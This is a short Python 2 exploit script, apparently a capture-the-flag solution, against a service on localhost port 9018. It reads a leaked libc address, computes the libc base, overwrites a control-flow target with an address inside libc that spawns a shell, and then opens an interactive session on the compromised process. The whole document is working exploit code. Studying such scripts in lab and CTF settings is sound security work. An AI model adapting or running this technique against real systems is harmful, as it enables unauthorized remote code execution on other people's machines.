from socket import *
import telnetlib
import struct

p = lambda x: struct.pack('I', x)
up = lambda x: struct.unpack('I', x)[0]

q = lambda x: struct.pack('Q', x)
uq = lambda x: struct.unpack('Q', x)[0]

def rw(t):
    r = ''
    while True:
        c = s.recv(1)
        if not c:
            break
        r += c
        if t in r:
            break
    return r

def interact():
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

def calc(n):
    if n & 0x80000000:
        n -= 0x100000000
    return n

HOST = 'localhost'
PORT = 9018

s = socket(AF_INET, SOCK_STREAM)
s.connect((HOST, PORT))

leaked = up(s.recv(4))
libc_base = leaked - 0x1afd60
comm_exec = calc(libc_base + 0x3a7f9)

print 'libc_base:', hex(libc_base)

s.send('%d\n' % calc(0x0804855c))
s.send('%d\n' % comm_exec)

print '[+] SH3RL0CKED!'
interact()
